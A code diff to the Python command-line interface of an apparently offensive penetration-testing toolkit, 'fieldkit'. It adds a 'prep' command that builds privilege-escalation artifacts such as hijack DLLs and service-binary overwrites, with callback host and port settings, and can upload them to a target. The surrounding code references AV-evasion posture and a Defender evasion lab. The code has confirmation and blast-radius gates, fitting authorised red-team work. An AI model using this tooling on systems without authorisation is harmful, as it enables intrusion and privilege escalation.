@@ -512,12 +512,18 @@ def cmd_escalate(args):
         delivery_order, caught = evasion_mod.posture(store.evasion_result, host["os"], now=now)
         vectors = escalate_mod.order_deliveries(vectors, delivery_order)
 
-        # the plan, before anything runs: what the loop would try, in order.
+        # the plan, before anything runs: what the loop would try, in order. Manual
+        # routes (prep-only) are shown but never auto-fired, so they aren't "runnable".
         gated = [v for v in vectors if not executor_mod.gate(v.safety, allow)]
-        runnable = [v for v in vectors if executor_mod.gate(v.safety, allow)]
+        runnable = [v for v in vectors
+                    if executor_mod.gate(v.safety, allow) and not getattr(v, "manual", False)]
         print(f"escalation plan for {args.host} — {_plural(len(vectors), 'vector')} ranked, "
               f"blast radius {'/'.join(allow)}:")
         for v in vectors:
+            if getattr(v, "manual", False):
+                print(f"  {v.key:<26} {v.axes:<18} {v.safety}"
+                      f"  (manual — {PROG} prep {args.host} {v.key})")
+                continue
             marks = []
             if v in gated:
                 marks.append(f"gated — needs --allow {v.safety}")
@@ -533,12 +539,21 @@ def cmd_escalate(args):
                 marks.append(f"auto-build {fmt} ({have})")
             mark = ("  (" + "; ".join(marks) + ")") if marks else ""
             print(f"  {v.key:<26} {v.axes:<18} {v.safety}{mark}")
+        manual = [v for v in vectors if getattr(v, "manual", False)]
         if not runnable:
+            if manual:
+                print(f"\n{_plural(len(manual), 'route')} here can't be auto-fired "
+                      "(operator hands needed) — prepare the artifact + steps:")
+                for v in manual:
+                    print(f"  {PROG} prep {args.host} {v.key}")
+                return 0
             _err("every vector is above the current --allow — re-run with --allow "
                  "config-change (and/or crash-risk) once you accept the blast radius")
             return 2
         if args.dry_run:
-            print(f"\ndry run — nothing fired. {_plural(len(runnable), 'vector')} would run.")
+            print(f"\ndry run — nothing fired. {_plural(len(runnable), 'vector')} would run"
+                  + (f"; {_plural(len(manual), 'manual route')} need `{PROG} prep`." if manual
+                     else "."))
             return 0
 
         budget = args.max if args.max is not None else escalate_mod.DEFAULT_BUDGET
@@ -650,6 +665,91 @@ def _print_escalation_outcome(outcome):
     else:
         print("no vector proved elevation — every ranked move was tried. See the trail "
               "for the per-vector verdict and its recommended manual step.")
+    manual = [a for a in outcome.attempts if a.action == escalate_mod.MANUAL]
+    if manual:
+        print(f"\n{_plural(len(manual), 'manual route')} can't be auto-fired — prepare "
+              "the artifact + steps with:")
+        for a in manual:
+            print(f"  {PROG} prep {a.vector.host} {a.vector.key}")
+
+
+def cmd_prep(args):
+    with _open_store(args) as store:
+        store.require_engagement()
+        cfg = config_mod.load(store)
+        host, cred, err = _resolve_target(store, args.host)
+        if host is None:
+            _err(err)
+            return 2
+        if args.stage and err:            # staging needs proven access; building doesn't
+            _err(err)
+            return 2
+        vector = privesc_mod.find_vector(store, args.host, args.vector, **_stage_dirs(cfg))
+        if vector is None:
+            available = [v.key for v in _host_vectors(store, cfg, args.host) if v.builds]
+            _err(f"no vector {args.vector!r} on {args.host}"
+                 + (f" — with a buildable artifact: {', '.join(available)}" if available
+                    else " — run `fieldkit enum` then `fieldkit analyze` first"))
+            return 2
+        if not vector.builds:
+            _err(f"{vector.key} has nothing to build — it's auto-fireable "
+                 f"(`{PROG} run {args.host} {vector.key}` or `{PROG} escalate`)")
+            return 2
+
+        arch = "x86" if cfg.get("arch") == "x86" else "x64"
+        built = []
+        for fmt, remote, bcmd in vector.builds:
+            out = os.path.join(_build_dir(), f"{vector.key.replace(':', '_')}.{fmt}")
+            bres = poc_mod.build(fmt, out, arch=arch, command=bcmd,
+                                 lhost=cfg.get("lhost"), lport=cfg.get("lport"))
+            if not bres.ok:
+                _err(f"build failed ({bres.tool}): {bres.detail}")
+                return 1
+            built.append([fmt, out, remote, bres.tool, None])
+
+        if args.stage:
+            if not _confirm(f"upload {_plural(len(built), 'artifact')} to {args.host} "
+                            "(writes to the target)?", args.yes):
+                print("built locally; not staged (declined)")
+                args.stage = False
+            else:
+                for entry in built:
+                    fmt, out, remote = entry[0], entry[1], entry[2]
+                    act = executor_mod.Action(
+                        host=host, cred=cred, command=None, label=f"prep:{fmt}",
+                        safety="config-change", upload=(out, remote),
+                        creates=[(f"prepped {fmt} at {remote}", f"del {remote}")])
+                    res = executor_mod.execute(store, act, allow=["read-only", "config-change"],
+                                               on_event=lambda m: print(m))
+                    if res.blocked or not res.ok:
+                        _err(f"stage failed: {res.blocked or 'upload error'}")
+                        return 1
+                    entry[4] = remote
+
+    _render_prep(vector, built)
+    return 0
+
+
+def _render_prep(vector, built):
+    pb = vector.playbook
+    print(f"\n=== prep: {vector.title} ===")
+    if pb:
+        print(pb.summary)
+    print("\nbuilt (attacker-side):")
+    for fmt, out, remote, tool, staged in built:
+        print(f"  {fmt:<4} {out}   (via {tool})")
+        if staged:
+            print(f"       staged on target → {staged}")
+        else:
+            print(f"       copy it to the target yourself → {remote}")
+    if not pb:
+        return
+    print(f"\nplace at: {pb.place}")
+    print("steps:")
+    for i, step in enumerate(pb.steps, 1):
+        print(f"  {i}. {step}")
+    if pb.restore:
+        print(f"\nrestore/cleanup: {pb.restore}")
 
 
 def cmd_poc(args):
@@ -1225,6 +1325,19 @@ def build_parser():
     p_poc.add_argument("--source", metavar="FILE", help="compile this .c with mingw (exe/dll)")
     p_poc.add_argument("--check", action="store_true", help="report which builders are installed")
     p_poc.set_defaults(func=cmd_poc)
+
+    p_prep = sub.add_parser(
+        "prep", help="build a manual route's artifact + print where to place it and the steps",
+        description="Proactive provision for routes the loop can't one-shot (overwrite a "
+                    "running service binary, plant a hijack DLL): fieldkit builds the "
+                    "artifact and prints the placement path + ordered operator steps. "
+                    "--stage also uploads it to the target's stage dir.")
+    p_prep.add_argument("host", metavar="IP", help="the host the vector is on")
+    p_prep.add_argument("vector", help="the manual vector key (e.g. writablesvc:AppMgmt)")
+    p_prep.add_argument("--stage", action="store_true",
+                        help="also upload the built artifact to the target (config-change)")
+    p_prep.add_argument("-y", "--yes", action="store_true", help="skip the confirm when staging")
+    p_prep.set_defaults(func=cmd_prep)
 
     p_lab = sub.add_parser(
         "lab", help="prove evasion techniques against a Defender lab host")
